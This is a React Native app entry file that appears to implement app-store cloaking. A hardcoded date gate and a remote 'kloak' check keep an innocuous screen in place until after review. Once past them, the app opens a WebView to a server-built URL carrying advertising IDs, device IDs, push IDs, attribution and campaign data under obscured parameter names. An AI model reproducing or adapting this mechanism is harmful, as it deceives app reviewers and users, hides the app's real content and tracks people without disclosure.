import React from 'react';
import {StatusBar} from 'react-native';
import AppNavigator from './src/navigation/AppNavigator';
import {
  OPTIONS,
  FB_APP_ID,
  FB_CLIENT_TOKEN,
  URL_IDENTIFAIRE,
  INITIAL_URL,
  ONE_SIGNAL_ID,
} from './config/credentials';
import AsyncStorage from '@react-native-async-storage/async-storage';
import appsFlyer from 'react-native-appsflyer';
import DeviceInfo from 'react-native-device-info';
import {PlayInstallReferrer} from 'react-native-play-install-referrer';
import FBDeepLink from 'react-native-fb-deeplink';
import {OneSignal, LogLevel} from 'react-native-onesignal';
import {Linking} from 'react-native';
import {handleGetAaid} from './config/getAaid';
import {generateTimestampUserId} from './config/utils';
import CustomeWelcome from './Target/CustomeWelcome';
import TargetScreen from './Target/TargetScreen';
import {useEffect, useState, useRef, useCallback, useMemo} from 'react';
import {createNativeStackNavigator} from '@react-navigation/native-stack';
import {NavigationContainer} from '@react-navigation/native';
import SplashScreen from './src/screens/SplashScreen';

const Stack = createNativeStackNavigator();

const FAIL_FETCH_URL = `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`;

//  UPDATE BEFORE DEPLOY
const targetData = new Date('2025-07-01T12:00:00Z');
const currentDate = new Date();

function App(): React.JSX.Element {
  // screen rendering
  const [isWelcomeComplete, setIsWelcomeComplete] = useState(false);
  // OneSignal
  const [oneSignalUserId, setOneSignalUserId] = useState(null);
  const [isOneSignalReady, setIsOneSignalReady] = useState(false);
  const [oneSignalPermissionStatus, setOneSignalPermissionStatus] =
    useState(false);
  // First Visit check
  const [timeStamp, setTimeStamp] = useState(null);
  const [isFirstVisit, setIsFirstVisit] = useState(null);
  // isReadyToVisitHandler
  const [isReadyToVisit, setIsReadyToVisit] = useState(false);
  const hasCheckedUrl = useRef(false);
  const urlCheckTimeout = useRef(null);
  const [isLoadingParams, setIsLoadingParams] = useState(false);
  // AppsFlyer
  const [idfv, setIdfv] = useState(null);
  const [aaid, setAaid] = useState(null);
  const [applsFlyerUID, setApplsFlyerUID] = useState(null);
  const [isNonOrganicInstall, setIsNonOrganicInstall] = useState(false);
  // const [isConversionDataReceived, setIsConversionDataReceived] =
  //   useState(false);
  // const [sabData, setSabData] = useState(null);
  // Push notifications
  const [openWithPush, setOpenWithPush] = useState(false);
  // Referrer
  const [nonOrganicData, setNonOrganicData] = useState({});

  const [afSiteId, setAfSiteId] = useState(null);
  const [afAd, setAfAd] = useState(null);
  const [afChannel, setAfChannel] = useState(null);
  const [mediaSource, setMediaSource] = useState(null);
  const [campaign, setCampaign] = useState(null);
  // deepLink
  const [deepLinkData, setDeepLinkData] = useState(null);
  const [isDeepLink, setIsDeepLink] = useState(false);
  const [finalProductUrl, setFinalProductUrl] = useState(null);
  const [isConversionDataReceived, setIsConversionDataReceived] =
    useState(false);
  const [isAppsFlyerReady, setIsAppsFlyerReady] = useState(false);
  const [referrer, setReferrer] = useState(null);
  const [appsResponse, setAppsResponse] = useState(null);

  useEffect(() => {
    const initializeApp = async () => {
      console.log('🚀 Starting app initialization...');
      try {
        console.log('📱 Initializing OneSignal...');
        await initOneSignal();

        console.log('🔗 Getting deep link...');
        await getDeepLink();

        console.log('👤 Checking first visit...');
        await checkFirstVisit();

        console.log('🌐 Checking if ready to visit...');
        await isReadyToVisitHandler();

        console.log('📊 Initializing AppsFlyer...');
        await initAppsFlyer();

        console.log('✅ App initialization sequence completed');
      } catch (error) {
        console.log('❌ Error during app initialization:', error);
      }
    };
    initializeApp();
  }, []);

  const getReferrer = useCallback(async () => {
    return new Promise((resolve, reject) => {
      PlayInstallReferrer.getInstallReferrerInfo((info, error) => {
        if (!error) {
          const referrer = info.installReferrer;
          // setReferrer(referrer);
          resolve(referrer);
        } else {
          console.log('Error getting referrer:', error);
          resolve(null);
        }
      });
    });
  }, []);

  const initOneSignal = useCallback(async () => {
    console.log('initOneSignal');
    OneSignal.Debug.setLogLevel(LogLevel.Verbose);
    // OneSignal Initialization
    OneSignal.initialize(ONE_SIGNAL_ID);
    try {
      // Request permission and get user ID
      const permissionResult = await OneSignal.Notifications.requestPermission(
        true,
      );

      setOneSignalPermissionStatus(permissionResult);
      console.log('OneSignal permission result:', permissionResult);

      // if (permissionResult) {
      const userId = await OneSignal.User.getOnesignalId();
      console.log('OneSignal: user id:', userId);

      if (userId) {
        setOneSignalUserId(userId);
        await AsyncStorage.setItem('oneSignalUserId', userId);
        // console.log(userId);
        setIsOneSignalReady(true);
      } else {
        setIsOneSignalReady(true);
        return;
        // console.log('get sequent permision');
        // // If no userId, set up a listener for when it becomes available
        // const userStateChangedListener = OneSignal.User.addEventListener(
        //   'change',
        //   async event => {
        //     console.log(event);
        //     const newUserId = await OneSignal.User.getOnesignalId();
        //     if (newUserId) {
        //       // console.log('OneSignal: got delayed user id:', newUserId);
        //       setOneSignalUserId(newUserId);
        //       await AsyncStorage.setItem('oneSignalUserId', newUserId);
        //       setIsOneSignalReady(true);
        //       userStateChangedListener.remove();
        //     }
        //   },
        // );
      }
      // }
    } catch (error) {
      console.error('Error initializing OneSignal:', error);
      // Fallback: try to get stored userId
      const storedUserId = await AsyncStorage.getItem('oneSignalUserId');
      if (storedUserId) {
        setOneSignalUserId(storedUserId);
        setIsOneSignalReady(true);
      }
    }
  }, []);

  const getDeepLink = useCallback(async () => {
    console.log('get Deep Link');
    try {
      await FBDeepLink.initialize(FB_APP_ID, FB_CLIENT_TOKEN);
      const deepLink = await FBDeepLink.getDeepLink();

      if (
        deepLink &&
        deepLink.length > 0 &&
        deepLink.split('?')[1].includes('_')
      ) {
        console.log('YES deepLink', deepLink);
        const parseDeepArray = deepLink.split('?')[1];
        await AsyncStorage.setItem('isDeeplinkExist', 'true');
        await AsyncStorage.setItem('deepLinkData', parseDeepArray);
        setDeepLinkData(parseDeepArray);
        setIsDeepLink(true);
      } else {
        console.log('NO deeplink', deepLink);
      }
    } catch (error) {
      console.error('Deep link initialization error:', error);
    }
  }, []);

  const checkFirstVisit = useCallback(async () => {
    console.log('SECOND FUNCTION');
    try {
      console.log('checkFirstVisit');
      const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');
      console.log('hasVisited from AsyncStorage:', hasVisited);

      // Get stored timestamp_user_id first
      let storedTimeStamp = await AsyncStorage.getItem('timeStamp');
      if (!storedTimeStamp) {
        // Generate new timestamp_user_id only if none exists
        storedTimeStamp = generateTimestampUserId();
        await AsyncStorage.setItem('timeStamp', storedTimeStamp);
        console.log('Generated new timestamp_user_id:', storedTimeStamp);
      } else {
        console.log('Retrieved stored timestamp_user_id:', storedTimeStamp);
      }

      // Set timestamp to use in app
      setTimeStamp(storedTimeStamp);

      if (!hasVisited) {
        console.log('hasVisited', hasVisited);
        console.log('FIRST app visit - setting isFirstVisit to true');
        setIsFirstVisit(true);

        OneSignal.User.addTag('timestamp_user_id', storedTimeStamp);
        OneSignal.login(storedTimeStamp);
        console.log('SEND TIME STAMP TO - OneSignal.login()');
      } else {
        console.log('NOT FIRST app visit - setting isFirstVisit to false');
        // Returning user
        retrieveStoredData();
        setIsFirstVisit(false);
      }
    } catch (error) {
      console.error('Error checking first visit:', error);
    }
  }, []);

  const isReadyToVisitHandler = useCallback(async () => {
    console.log('THIRD FUNCTION');

    try {
      console.log('isReadyToVisitHandler check kload,hasVisited..');
      const kloakSuccess = await AsyncStorage.getItem('kloakSuccess');
      const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');
      const visitUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
      console.log('hasVisited', hasVisited);
      console.log('kloakSuccess', kloakSuccess);

      if (currentDate >= targetData) {
        console.log('currentDate >= targetData- WebView will be opened');
        if (hasVisited && kloakSuccess) {
          setIsReadyToVisit(true);
        }
        if (!hasVisited) {
          console.log('First visit - checking URL');
          // Don't set hasVisitedBefore here - wait for AppsFlyer conversion data

          try {
            const response = await fetch(visitUrl);

            console.log('URL status:', response.status);
            console.log('visitUrl', visitUrl);
            if (response.status === 200) {
              await AsyncStorage.setItem('kloakSuccess', 'true');

              if (currentDate >= targetData) {
                setIsReadyToVisit(true);
                console.log('Current date passed target date, ready to visit');
              } else {
                setIsReadyToVisit(false);
                console.log('Current date has not passed target date');
              }
            } else {
              setIsReadyToVisit(false);
            }
          } catch (error) {
            console.log('❌ URL fetch error:', error);
            setIsReadyToVisit(false);
          }
        }
      } else {
        console.log('currentDate < targetData- WebView will not open');
        setIsReadyToVisit(false);
      }
    } catch (error) {
      console.log('Error in isReadyToVisitHandler:', error);
      setIsReadyToVisit(false);
    }
  }, []);

  const initAppsFlyer = useCallback(() => {
    return new Promise(resolve => {
      console.log('initAppsFlyer');

      // Set up conversion data listener first
      appsFlyer.onInstallConversionData(async res => {
        console.log('AppsFlyer Conversion Data received:', res);
        setAppsResponse(res?.data);
        // Get referrer right before setting it
        const currentReferrer = await getReferrer();
        console.log('Current referrer before setting:', currentReferrer);

        if (currentReferrer) {
          appsFlyer.setAdditionalData({referrer: currentReferrer}, res => {
            console.log('Referrer set in AppsFlyer:', res);
            setReferrer(currentReferrer);
          });
        }

        if (JSON.parse(res.data.is_first_launch) === true) {
          // console.log('Is app first launch-', res);

          if (res.data.af_status === 'Non-organic') {
            const media_source = res.data.media_source;
            const campaign = res.data.campaign;
            const af_siteid = res.data.af_siteid ?? '';
            const af_ad = res.data.af_ad || '';
            const af_channel = res.data.af_channel || '';

            try {
              await AsyncStorage.setItem('sabData', campaign);
              await AsyncStorage.setItem('media_source', media_source);
              await AsyncStorage.setItem('af_siteid', af_siteid);
              await AsyncStorage.setItem('af_ad', af_ad);
              await AsyncStorage.setItem('af_channel', af_channel);
              // setSabData(campaign);

              setCampaign(campaign);
              setMediaSource(media_source);
              setAfSiteId(af_siteid);
              setAfAd(af_ad);
              setAfChannel(af_channel);

              setIsNonOrganicInstall(true);
              await AsyncStorage.setItem('isNonOrganicInstall', 'true');
            } catch (error) {
              console.error('Error saving non-organic data:', error);
            }
          } else if (res.data.af_status === 'Organic') {
            console.log('Organic install detected');

            setIsNonOrganicInstall(false);
            try {
              // setSabData(sabData);
              setIsNonOrganicInstall(false);
              await AsyncStorage.setItem('isNonOrganicInstall', 'false');
            } catch (error) {
              console.error('Error saving organic data:', error);
            }
          }
        } else {
          console.log('Not first app launch');
          try {
            const storedSabData = await AsyncStorage.getItem('sabData');
            const storedIsNonOrganic = await AsyncStorage.getItem(
              'isNonOrganicInstall',
            );

            if (storedSabData) {
              // setSabData(storedSabData);
            }
            setIsNonOrganicInstall(storedIsNonOrganic === 'true');
          } catch (error) {
            console.error('Error retrieving stored data:', error);
          }
        }

        // Mark conversion data as received
        setIsConversionDataReceived(true);

        // Mark AppsFlyer as ready for returning users too
        setIsAppsFlyerReady(true);
        console.log('✅ AppsFlyer is now ready (returning user)');

        // Set hasVisitedBefore flag after conversion data is processed
        // This ensures isFirstVisit remains true until AppsFlyer data is available
        await AsyncStorage.setItem('hasVisitedBefore', 'true');
        console.log(
          '✅ hasVisitedBefore set to true after AppsFlyer conversion data processed',
        );

        // Mark AppsFlyer as ready
        setIsAppsFlyerReady(true);
        console.log('✅ AppsFlyer is now ready');

        // Resolve the promise when conversion data is processed
        console.log(
          '✅ AppsFlyer conversion data processed - resolving promise',
        );
        resolve();
      });

      // Get AAID
      handleGetAaid().then(aaid => {
        console.log(aaid);
        setAaid(aaid);
      });

      // Get device unique ID and initialize SDK
      DeviceInfo.getUniqueId()
        .then(deviceId => {
          console.log('Device id-', deviceId);
          setIdfv(deviceId);

          // Initialize AppsFlyer SDK
          appsFlyer.initSdk(
            OPTIONS,
            res => {
              console.log('AppsFlyer SDK initialized successfully:', res);
              // Set customer user ID
              appsFlyer.setCustomerUserId(deviceId);

              // Get AppsFlyer UID
              appsFlyer.getAppsFlyerUID((err, appsFlyerUID) => {
                if (err) {
                  console.error(err);
                } else {
                  setApplsFlyerUID(appsFlyerUID);
                }
              });
            },
            error => {
              console.error('AppsFlyer SDK failed to start:', error);
              // Even if SDK fails, resolve the promise to continue
              resolve();
            },
          );
          // // !!
          appsFlyer.startSdk();
        })
        .catch(error => {
          console.error('Error in device info:', error);
          // Set defaults to allow app to continue
          setIdfv('unknown-device');
          // Resolve even if device info fails
          resolve();
        });
    });
  }, []);

  // Modify the handleNotificationClick function
  const handleNotificationClick = useCallback(async event => {
    const timeStamp = await AsyncStorage.getItem('timeStamp');
    const baseUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
    let finalUrl;

    try {
      const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');

      if (event.notification.launchURL) {
        // console.log('Regular push_open_browser case', event);
        finalUrl = `${baseUrl}?event=push_open_browser&timestamp_user_id=${timeStamp}`;
        await fetch(finalUrl);
        await Linking.openURL(finalUrl);
        // await AsyncStorage.setItem('openedWithPush', JSON.stringify(true));
        setOpenWithPush(true);
      } else {
        // console.log('Regular push_open_webview case', event);
        finalUrl = `${baseUrl}?event=push_open_webview&timestamp_user_id=${timeStamp}`;
        setOpenWithPush(true);
        // await AsyncStorage.setItem('openedWithPush', JSON.stringify(true));

        if (!hasVisited) {
          await AsyncStorage.setItem('hasVisitedBefore', 'true');
          console.log('Marked as visited for the first time');
        }

        await fetch(finalUrl);
      }
    } catch (error) {
      console.error('🔔 Error handling notification:', error);
    }
  }, []);

  // Add back the notification setup
  useEffect(() => {
    const setupNotifications = async () => {
      try {
        // Add notification click listener with the handler
        const clickListener = OneSignal.Notifications.addEventListener(
          'click',
          event => {
            handleNotificationClick(event);
          },
        );

        return () => {
          clickListener.remove();
        };
      } catch (error) {
        console.error('🔔 Error setting up notifications:', error);
      }
    };

    setupNotifications();
    // }, [handleNotificationClick]);
  }, []);

  const isReadyForTestScreen = useMemo(() => {
    // Basic requirements for all launches
    // console.log('isReadyForTestScreen fn ');
    // console.log('isReadyToVisit', isReadyToVisit);
    const baseRequirements = isReadyToVisit;
    // console.log('baseRequirements', baseRequirements);
    if (isFirstVisit) {
      // console.log('baseRequirements', baseRequirements);
      return baseRequirements;
    }
    // For subsequent launches, only need base requirements
    // console.log('IS APP READY FOR PRODUCT TO BE OPENE', baseRequirements);
    // console.log('baseRequirements', baseRequirements);
    return baseRequirements;
  }, [isReadyToVisit, isFirstVisit]);

  // Add effect to update loading state
  useEffect(() => {
    if (isReadyForTestScreen) {
      setIsLoadingParams(false);
    }
  }, [isReadyForTestScreen]);

  const retrieveStoredData = useCallback(async () => {
    console.log('retrieve stored data fn');
    try {
      const storedData = {
        media_source: await AsyncStorage.getItem('media_source'),
        campaign: await AsyncStorage.getItem('sabData'),
        af_siteid: await AsyncStorage.getItem('af_siteid'),
        af_ad: await AsyncStorage.getItem('af_ad'),
        af_channel: await AsyncStorage.getItem('af_channel'),
        isDeeplinkExist: await AsyncStorage.getItem('isDeeplinkExist'),
        deepLinkData: await AsyncStorage.getItem('deepLinkData'),
      };
      console.log(storedData);
      setNonOrganicData(storedData);
    } catch (error) {
      console.error('Error retrieving stored data:', error);
    }
  }, []);
  const constructUrl = () => {
    console.log('🚀 CONSTRUCT URL - AppsFlyer is ready, building final URL');

    // Validate that we have the minimum required data
    if (!timeStamp || !idfv) {
      console.log('❌ Missing required data for URL construction:', {
        timeStamp,
        idfv,
      });
      return null;
    }

    const sumDataSub20 = {
      appsResponse: appsResponse,
      // deepLink: deepLinkData ?? '',
      referrer: referrer,
    };
    const deepLinkParams = {
      deepLink: deepLinkData ?? 'deep_link_missed',
    };

    const deeplinkParam = `${deepLinkData}`;

    const organicAppsData = appsResponse
      ? `,${appsResponse.status || 'no_status_in_organic'},${
          appsResponse.type || 'no_type_in_organic'
        },${appsResponse.install_time || ''},${appsResponse.af_message || ''},${
          appsResponse.af_status || ''
        },${appsResponse.is_first_launch === true ? 'true' : 'false' || ''},${
          appsResponse.type || ''
        },${appsResponse.type || ''}`
      : '';

    const nonOrganicApps = appsResponse
      ? `FIRST_LAUNCH:${
          appsResponse.is_first_launch === true ? 'true' : 'false'
        },CLICK_TIME:${appsResponse.click_time || 'nill'},AF_CHANNEL:${
          appsResponse.af_channel || 'nill'
        },CAMPAIGN_ID:${appsResponse.campaign_id || 'nill'},INSTALL_TIME:${
          appsResponse.install_time || 'nill'
        },MEDIA_SOURCE:${appsResponse.media_source || 'nill'},AF_SITEID:${
          appsResponse.af_siteid || 'nill'
        },AF_STATUS:${appsResponse.af_status || 'nill'},AF_SUB1:${
          appsResponse.af_sub1 || 'nill'
        },CAMPAIGN:${appsResponse.campaign || 'nill'},AF_AD:${
          appsResponse.af_ad || 'nill'
        }`
      : 'NO_DATA_OBJECT';

    console.log('SUB 20 DATA-', sumDataSub20);

    const baseUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`;
    const params = new URLSearchParams();

    // Add common parameters that are always needed
    params.append('idfa', aaid);
    params.append('oneSignalId', oneSignalUserId);
    params.append('idfv', idfv);
    params.append('uid', applsFlyerUID);
    params.append('customerUserId', idfv);
    // params.append('timestamp_user_id', timeStamp);
    params.append('jthrhg', timeStamp);
    // params.append(
    //   'sub_id_20',
    //   encodeURIComponent(JSON.stringify(sumDataSub20)),
    // );

    params.append(
      'sub_id_20',
      `APPSFLYER:${organicAppsData}|${nonOrganicApps}|'REFERRER'${referrer}`,
    );

    // Handle non-organic parameters based on whether it's first visit or not
    if (isFirstVisit) {
      console.log('🔵 FIRST VISIT - Using AppsFlyer conversion data');
      console.log('🔵 mediaSource:', mediaSource);
      console.log('🔵 afSiteId:', afSiteId);
      console.log('🔵 afAd:', afAd);
      console.log('🔵 afChannel:', afChannel);
      // For first visit, use the data from AppsFlyer
      if (mediaSource) params.append('media_source', mediaSource);
      if (afSiteId) params.append('af_siteid', afSiteId);
      if (afAd) params.append('af_ad', afAd);
      if (afChannel) params.append('af_channel', afChannel);
    } else {
      console.log('🟡 SUBSEQUENT VISIT - Using stored AsyncStorage data');
      console.log('🟡 nonOrganicData:', nonOrganicData);
      // For subsequent visits, use the stored data from AsyncStorage
      if (nonOrganicData.media_source)
        params.append('media_source', nonOrganicData.media_source);

      if (nonOrganicData.af_siteid)
        params.append('af_siteid', nonOrganicData.af_siteid);
      if (nonOrganicData.af_ad) params.append('af_ad', nonOrganicData.af_ad);
      if (nonOrganicData.af_channel)
        params.append('af_channel', nonOrganicData.af_channel);
    }

    let productUrl = `${baseUrl}&${params.toString()}`;
    // console.log(productUrl);

    console.log('opened with push', openWithPush);
    if (openWithPush) {
      productUrl += '&yhugh=true';
      // console.log('Adding push notification parameter to URL', productUrl);
    }

    if (isFirstVisit) {
      if (isNonOrganicInstall) {
        productUrl += '&testParam=NON-ORGANIC';
        console.log(productUrl);
        if (!campaign) {
          productUrl += '&testParam=CONVERT-SUBS-MISSING-SPLITTER';
        } else if (campaign.includes('_')) {
          const sabParams = campaign
            .split('_')
            .map((item, i) => (item ? `subId${i + 1}=${item}` : ''))
            .join('&');
          productUrl += `&testParam=NON-ORGANIC&${sabParams}`;
        } else {
          productUrl += '&testParam=CONVERT-SUBS-MISSING-SPLITTER';
        }
      } else {
        productUrl += '&testParam=ORGANIC';
        console.log('ORGANIC LINK BUILD');
        if (isDeepLink && deepLinkData && deepLinkData.includes('_')) {
          console.log(
            'Adding deep link data if organic install:',
            isDeepLink,
            deepLinkData,
          );

          const deeplinkParams = deepLinkData
            .split('_')
            .map((item, i) => (item ? `subId${i + 1}=${item}` : ''))
            .join('&');
          productUrl += `&${deeplinkParams}&sub_id_20=${deeplinkParam}`;
          console.log(productUrl);

          console.log('PRODUCT LINK- ', productUrl);
        }
      }
    } else {
      // ! NOT FIRST VISIT CASE
      console.log('NOT FIRST LAUNCH');
      if (nonOrganicData.campaign && nonOrganicData.campaign.includes('_')) {
        const sabParams = nonOrganicData.campaign
          .split('_')
          .map((item, index) => (item ? `subId${index + 1}=${item}` : ''))
          .join('&');
        productUrl += `&${sabParams}`;
        console.log(productUrl);
      }

      console.log('IS DEEP LINK', nonOrganicData.deepLinkData);
      console.log('IS DEEPLINK EXIST', nonOrganicData.isDeeplinkExist);
      if (nonOrganicData.isDeeplinkExist && nonOrganicData.deepLinkData) {
        console.log('NOT FIRST VISIT + DEEPLINK');
        if (nonOrganicData.deepLinkData.includes('_')) {
          const deeplinkParams = nonOrganicData.deepLinkData
            .split('_')
            .map((item, i) => (item ? `subId${i + 1}=${item}` : ''))
            .join('&');
          productUrl += `&${deeplinkParams}`;
          console.log(productUrl);
        }
        console.log('NOT FIRST LAUNCH LINK', productUrl);
        productUrl;
      }
    }

    console.log('✅ FINAL Constructed URL:', productUrl);

    // console.log(
    //   aaid,
    //   applsFlyerUID,
    //   idfv,
    //   isFirstVisit,
    //   oneSignalUserId,
    //   timeStamp,
    //   nonOrganicData,
    //   mediaSource,
    //   campaign,
    //   afSiteId,
    //   afAd,
    //   afChannel,
    //   isNonOrganicInstall,
    //   openWithPush,
    //   isDeepLink,
    //   deepLinkData,
    // );

    return productUrl;
  };

  // Add separate useEffect to call constructUrl and set state
  useEffect(() => {
    // console.log('🔄 useEffect triggered with:', {
    //   isAppsFlyerReady,
    //   isConversionDataReceived,
    //   isFirstVisit,
    // });

    // Step 1: Wait for AppsFlyer to be fully ready
    if (!isAppsFlyerReady) {
      console.log('⏳ Step 1: Waiting for AppsFlyer to be ready...');
      return;
    }
    console.log('✅ Step 1: AppsFlyer is ready');

    // Step 2: For first visits, also wait for conversion data
    // console.log('🔍 Step 2: Checking conversion data requirement...');
    // console.log('   - isFirstVisit:', isFirstVisit);
    // console.log('   - isConversionDataReceived:', isConversionDataReceived);
    // console.log(
    //   '   - Condition (isFirstVisit && !isConversionDataReceived):',
    //   isFirstVisit && !isConversionDataReceived,
    // );

    if (isFirstVisit && !isConversionDataReceived) {
      console.log('⏳ Step 2: Waiting for conversion data (first visit)...');
      return;
    }
    console.log(
      '✅ Step 2: Conversion data check passed (returning user or data received)',
    );

    console.log('isConversionDataReceived -', isConversionDataReceived);
    // Step 3: Now we can safely build the URL
    console.log('🚀 Step 3: All conditions met - calling constructUrl...');
    const url = constructUrl();
    if (url) {
      // console.log('✅ URL built successfully:', url);
      setFinalProductUrl(url);
      console.log('isConversionDataReceived -', isConversionDataReceived);
      console.log('TARGET SCREEN OPEN');
      // Only close welcome screen after URL is successfully built
      setIsWelcomeComplete(true);
    } else {
      console.log('❌ Failed to build URL - missing required data');
      // Don't close welcome screen if URL construction fails
      // This prevents TargetScreen from opening with null URL

      // Optional: Add fallback timer to prevent infinite waiting
      setTimeout(() => {
        if (!isWelcomeComplete) {
          console.log(
            '⚠️ URL construction timeout - forcing welcome screen close',
          );
          // Mark conversion data as received
          // setIsConversionDataReceived(true);
          setFinalProductUrl(FAIL_FETCH_URL);
          setIsWelcomeComplete(true);
        }
      }, 25000); // 25 second fallback
    }
  }, [isAppsFlyerReady, isConversionDataReceived, isFirstVisit]);

  return (
    <NavigationContainer>
      <Stack.Navigator
        // initialRouteName="Splash"
        screenOptions={{headerShown: false}}>
        {!isWelcomeComplete ? (
          <>
            <Stack.Screen name="CustomeWelcome" component={CustomeWelcome} />
          </>
        ) : !isLoadingParams && isReadyForTestScreen ? (
          <>
            <Stack.Screen
              name="TargetScreen"
              component={TargetScreen}
              initialParams={{
                isFirstVisit,
                timeStamp,
                url: finalProductUrl,
                oneSignalPermissionStatus,
              }}
            />
          </>
        ) : (
          <>
            <Stack.Screen name="AppNavigator" component={AppNavigator} />
          </>
        )}
        {/* <AppNavigator /> */}
      </Stack.Navigator>
    </NavigationContainer>
  );
}

export default App;
